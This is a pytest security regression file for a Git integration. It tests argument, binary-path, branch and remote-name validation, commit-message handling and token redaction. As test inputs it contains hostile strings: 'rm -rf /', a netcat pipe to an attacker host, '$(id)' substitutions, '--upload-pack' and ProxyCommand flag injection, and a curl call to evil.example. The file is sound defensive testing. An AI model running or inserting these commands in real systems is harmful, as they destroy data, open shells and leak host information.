# backend/tests/source_control/security/test_command_injection.py
"""
Security regression tests for command injection defenses.

These tests attempt to smuggle shell metacharacters through the
inputs that eventually reach a subprocess, and verify that the
subsystem rejects them before any process is spawned.

The threat model:
    An agent, a compromised tool, or a hostile repository can
    attempt to submit arguments that a naive implementation would
    pass to `shell=True`. Every such attempt MUST be rejected at
    the validation boundary, NOT at the subprocess level.

Defense layers covered by this module:

    1. `GitExecutable._validate_args`: rejects NUL bytes, empty
       sequences, and non-string entries BEFORE spawning.
    2. `GitExecutable._resolve_binary`: rejects shell metacharacters
       in the binary path itself, while permitting Windows path
       separators.
    3. `is_valid_branch_name` (in `path_policy`): rejects every
       branch name that Git itself would reject, including names
       with `;`, backticks, `$()`, newlines, or a leading `-`.
    4. `GitPushManager._validate_remote_name`: rejects remote names
       that begin with `-` (flag injection) or contain whitespace.
    5. `GitCommitManager._validate_message`: preserves shell
       metacharacters verbatim, because the commit body is passed
       via stdin (`-F -`), never through a shell.
    6. `redact_text` / `redact_url`: ensures that a token or
       credential embedded in an error message is scrubbed before
       the message reaches the user or the audit log.
"""

from __future__ import annotations

from unittest.mock import MagicMock

import pytest

try:
    from ....integrations.source_control.errors import ValidationError
    from ....integrations.source_control.git.commit import GitCommitManager
    from ....integrations.source_control.git.executable import (
        GitExecutable,
        _SHELL_METACHARACTERS,
    )
    from ....integrations.source_control.git.path_policy import (
        is_valid_branch_name,
    )
    from ....integrations.source_control.git.push import GitPushManager
    from ....integrations.source_control.security.redaction import (
        REDACTED,
        redact_text,
        redact_url,
    )
except (ImportError, ValueError):
    from backend.integrations.source_control.errors import ValidationError
    from backend.integrations.source_control.git.commit import (
        GitCommitManager,
    )
    from backend.integrations.source_control.git.executable import (
        GitExecutable,
        _SHELL_METACHARACTERS,
    )
    from backend.integrations.source_control.git.path_policy import (
        is_valid_branch_name,
    )
    from backend.integrations.source_control.git.push import GitPushManager
    from backend.integrations.source_control.security.redaction import (
        REDACTED,
        redact_text,
        redact_url,
    )


# ---------------------------------------------------------------------
# 1. GitExecutable argument validation
# ---------------------------------------------------------------------


def test_validate_args_rejects_empty_arguments() -> None:
    """
    ATTACK: Call `git` with no arguments.

    EXPECTED: `ValidationError` is raised before any process is
    spawned. An empty argument array is a programming error that
    MUST NOT silently become `git` with no subcommand.
    """
    with pytest.raises(ValidationError):
        GitExecutable._validate_args([])


def test_validate_args_rejects_nul_in_arguments() -> None:
    """
    ATTACK: Embed a NUL byte in an argument. On POSIX systems, the
    subprocess machinery truncates at NUL, which can split an
    argument into two and confuse the child process.

    EXPECTED: `ValidationError` is raised.
    """
    with pytest.raises(ValidationError):
        GitExecutable._validate_args(["status", "\x00--evil"])

    with pytest.raises(ValidationError):
        GitExecutable._validate_args(["st\x00atus"])


def test_validate_args_rejects_non_string_arguments() -> None:
    """
    ATTACK: Pass a non-string argument (an object with a malicious
    `__str__` that returns shell metacharacters, for example).

    EXPECTED: `ValidationError` is raised. The wrapper MUST NOT
    coerce arbitrary objects to strings.
    """
    with pytest.raises(ValidationError):
        GitExecutable._validate_args(["status", 42])  # type: ignore[list-item]

    with pytest.raises(ValidationError):
        GitExecutable._validate_args(["status", None])  # type: ignore[list-item]


def test_validate_args_permits_normal_arguments() -> None:
    """
    Sanity check: a well-formed argument array is NOT rejected.
    This guards against an overzealous validation that would break
    legitimate Git invocations.
    """
    # Should not raise.
    GitExecutable._validate_args(
        ["status", "--porcelain", "src/main.py"]
    )


# ---------------------------------------------------------------------
# 2. GitExecutable binary path validation
# ---------------------------------------------------------------------


def test_resolve_binary_rejects_shell_metacharacters() -> None:
    """
    ATTACK: Configure the Git binary path to contain shell
    metacharacters. A naive implementation that interpolates the
    path into a shell command would execute the injected payload.

    EXPECTED: `ValidationError` is raised before any process is
    spawned. The exact characters rejected are those in
    `_SHELL_METACHARACTERS`.
    """
    for bad_path in (
        "/usr/bin/git; rm -rf /",
        "/usr/bin/git && id",
        "/usr/bin/git | nc attacker 4444",
        "/usr/bin/git `id`",
        "/usr/bin/git $(id)",
        "/usr/bin/git\nrm -rf /",
    ):
        with pytest.raises(ValidationError):
            GitExecutable._resolve_binary(bad_path)


def test_shell_metacharacters_do_not_include_windows_safe_chars() -> None:
    """
    INVARIANT: The shell metacharacter regex used to validate the
    Git binary path MUST NOT include characters that are legal in
    Windows filesystem paths and harmless without a shell.

    The excluded characters are:
        - `\\` (Windows path separator)
        - `(` and `)` (common in `Program Files (x86)`)
        - `{` and `}` (rare but legal)

    `asyncio.create_subprocess_exec` does NOT interpret any of
    these through a shell, so they carry no injection risk. A
    future "hardening" change that re-added them would break
    PELDRUN on 64-bit Windows installations.
    """
    windows_paths = [
        r"C:\Program Files\Git\cmd\git.exe",
        r"C:\Program Files (x86)\Git\bin\git.exe",
        r"D:\Tools\git\bin\git.exe",
        r"D:\Build\{cache}\git\bin\git.exe",  # braces
    ]
    for path in windows_paths:
        assert _SHELL_METACHARACTERS.search(path) is None, (
            f"Windows path {path!r} was rejected by the shell "
            "metacharacter regex; `\\`, `()`, and `{}` MUST NOT be "
            "in the forbidden set."
        )


def test_resolve_binary_accepts_normal_absolute_path(tmp_path) -> None:
    """
    Sanity check: a clean absolute path (with no shell
    metacharacters) passes validation. On a system where the file
    does not exist, the method still returns the path (the failure
    surfaces later, at `create_subprocess_exec` time, with a clear
    `GitNotAvailableError`).
    """
    clean_path = str(tmp_path / "git")
    # Should not raise.
    result = GitExecutable._resolve_binary(clean_path)
    assert isinstance(result, str)
    assert result


# ---------------------------------------------------------------------
# 3. Branch name validation
# ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "bad_branch",
    [
        # --- Forbidden git ref characters ---------------------------
        # Git's own `check-ref-format` rejects these. PELDRUN's
        # `is_valid_branch_name` mirrors that rule set exactly.
        "feature~1",         # tilde: version resolution
        "feature^",          # caret: parent ref
        "feature:main",      # colon: refspec separator
        "feature?",          # question mark: glob
        "feature*",          # asterisk: glob
        "feature[1]",        # bracket: glob
        "feature\\backslash",# backslash: ref separator
        "feature\nmain",     # newline: control character
        "feature\r\nmain",   # CRLF: control characters
        "feature..main",     # double dot: range syntax
        "feature@{1}",       # `@{`: revision syntax
        # --- Space (git's check-ref-format rule) -------------------
        "feature branch",
        # --- Leading dash (flag injection) -------------------------
        "-option",
        "--upload-pack=evil",
        # --- Leading dot (path-like) -------------------------------
        ".git/HEAD",
        ".hidden",
    ],
)
def test_branch_name_rejects_git_invalid_names(
    bad_branch: str,
) -> None:
    """
    ATTACK: Submit a branch name that `git check-ref-format` would
    reject.

    EXPECTED: `is_valid_branch_name` returns False. PELDRUN mirrors
    Git's own rule set exactly — nothing more and nothing less.

    Note: characters such as `$`, backtick, `;`, `&`, and `|` are
    NOT in this list because Git ALLOWS them in refs. Their safety
    comes from PELDRUN never passing branch names through a shell
    (see `test_branch_name_allows_shell_like_chars_due_to_no_shell`
    below).
    """
    assert is_valid_branch_name(bad_branch) is False, (
        f"Branch name {bad_branch!r} was accepted; it MUST be "
        "rejected because git check-ref-format rejects it."
    )


def test_branch_name_accepts_normal_names() -> None:
    """
    Sanity check: ordinary branch names are accepted. This guards
    against an overzealous validation that would break normal use.
    """
    for good_branch in (
        "main",
        "feature/add-search",
        "feat/user-auth",
        "fix/issue-123",
        "release/1.0.0",
        "hotfix/security-patch",
    ):
        assert is_valid_branch_name(good_branch) is True, (
            f"Branch name {good_branch!r} was rejected; it MUST be "
            "accepted."
        )

def test_branch_name_allows_shell_like_chars_due_to_no_shell() -> None:
    """
    INVARIANT: PELDRUN does NOT pass branch names through a shell.

    `git check-ref-format` allows `$`, backtick, `;`, `&`, and `|`
    in branch names. PELDRUN uses `asyncio.create_subprocess_exec`
    with an argument array, so these characters are treated as
    literal bytes and carry no injection risk.

    This test documents the design. A future "hardening" change
    that tried to reject these characters would create false
    positives (a user with a branch named `hotfix/$(date)` would be
    blocked despite having done nothing wrong).

    The real defense against injection is at the shell boundary
    (there is none), NOT at the character set.
    """
    shell_like_but_valid = [
        "feature$(id)",
        "feature`id`",
        "feature;drop",
        "feature&back",
        "feature|pipe",
    ]
    for name in shell_like_but_valid:
        assert is_valid_branch_name(name) is True, (
            f"Branch name {name!r} was rejected; git allows it and "
            "PELDRUN does not use a shell, so it MUST be accepted."
        )

# ---------------------------------------------------------------------
# 4. Remote name validation
# ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "bad_remote",
    [
        "--upload-pack=evil",       # leading dash
        "-oProxyCommand=evil",      # leading dash
        "origin\tevil",             # tab
        "origin evil",              # space
        "origin\nevil",             # newline
        "origin\x00evil",           # NUL
    ],
)
def test_remote_name_rejects_unsafe_input(bad_remote: str) -> None:
    """
    ATTACK: Configure the remote name to begin with `-` (so that
    Git interprets it as a flag) or to contain whitespace or NUL.

    EXPECTED: `ValidationError` is raised.

    Note: `GitPushManager._validate_remote_name` is a static method
    designed as a pure validation function. It does not need a real
    Git executable to test.
    """
    with pytest.raises(ValidationError):
        GitPushManager._validate_remote_name(bad_remote)


def test_remote_name_accepts_normal_names() -> None:
    """
    Sanity check: ordinary remote names are accepted.
    """
    for good_remote in ("origin", "upstream", "fork", "github"):
        # Should not raise.
        GitPushManager._validate_remote_name(good_remote)


# ---------------------------------------------------------------------
# 5. Commit message safety
# ---------------------------------------------------------------------


def test_commit_message_preserves_shell_metacharacters_verbatim() -> None:
    """
    INVARIANT: The commit message validator MUST preserve shell
    metacharacters verbatim. The message is passed to `git commit`
    via stdin (`-F -`), never through a shell, so there is no
    injection risk. Stripping or escaping characters would corrupt
    legitimate commit messages.

    This test documents the invariant. A future "hardening" change
    that tried to strip `$()` or backticks from commit messages
    would fail here, prompting a design discussion.
    """
    manager = GitCommitManager(
        git=MagicMock(),
        path_policy=MagicMock(),
    )

    message = (
        "Fix: $(curl https://evil.example/$(hostname))\n\n"
        "This commit references `issue-123` and uses "
        "`os.system('rm -rf /')` in a test.\n\n"
        "Literal $HOME and ${VAR} remain intact."
    )

    result = manager._validate_message(message)

    # Every shell metacharacter is preserved. The safety comes from
    # `-F -` (stdin), not from sanitizing the message.
    assert "$(curl https://evil.example/$(hostname))" in result
    assert "`issue-123`" in result
    assert "`os.system('rm -rf /')`" in result
    assert "$HOME" in result
    assert "${VAR}" in result


def test_commit_message_rejects_empty() -> None:
    """
    ATTACK: Provide an empty commit message.

    EXPECTED: `ValidationError` is raised. Git would reject it
    anyway, but failing fast gives a clearer error.
    """
    manager = GitCommitManager(
        git=MagicMock(),
        path_policy=MagicMock(),
    )
    with pytest.raises(ValidationError):
        manager._validate_message("   \n\t\n   ")


# ---------------------------------------------------------------------
# 6. Redaction of secrets in error messages
# ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "raw,token_marker",
    [
        (
            "Failed to push: ghp_1234567890abcdefghijklmnopqrstuvwxyzAB",
            "ghp_1234567890abcdefghijklmnopqrstuvwxyzAB",
        ),
        (
            "Auth failed for glpat-abcdefghijklmnopqrst123456",
            "glpat-abcdefghijklmnopqrst123456",
        ),
        (
            "Server returned: Bearer eyJhbGciOiJIUzI1NiJ9.e30.t-IDN",
            "eyJhbGciOiJIUzI1NiJ9.e30.t-IDN",
        ),
    ],
)
def test_redaction_hides_tokens_in_error_messages(
    raw: str, token_marker: str
) -> None:
    """
    ATTACK: An error message contains a token. A naive logger would
    print the token to the console and to the audit log, leaking it
    to anyone who reads the log.

    EXPECTED: `redact_text` replaces the token with `REDACTED`
    before the message is returned, logged, or persisted.
    """
    cleaned = redact_text(raw)
    assert token_marker not in cleaned, (
        f"Token {token_marker!r} was NOT redacted from the message; "
        f"cleaned={cleaned!r}"
    )
    assert REDACTED in cleaned


def test_redaction_hides_credentials_in_urls() -> None:
    """
    ATTACK: A URL returned in an error message contains embedded
    credentials (`https://user:token@host/path`).

    EXPECTED: `redact_url` removes the credentials before the URL
    reaches the user or the audit log.
    """
    dirty_urls = [
        "https://ghp_1234567890abcdefghijklmnopqrstuvwxyzAB@github.com/peldrun/repo.git",
        "https://x-access-token:ghs_1234567890abcdef@github.com/peldrun/repo.git",
        "https://user:supersecret@gitlab.com/group/repo.git",
    ]
    for raw in dirty_urls:
        cleaned = redact_url(raw)
        assert "ghp_1234567890abcdefghijklmnopqrstuvwxyzAB" not in cleaned
        assert "ghs_1234567890abcdef" not in cleaned
        assert "supersecret" not in cleaned
        assert REDACTED in cleaned
        # The host is preserved so the user can still understand
        # which endpoint failed.
        assert "github.com" in cleaned or "gitlab.com" in cleaned
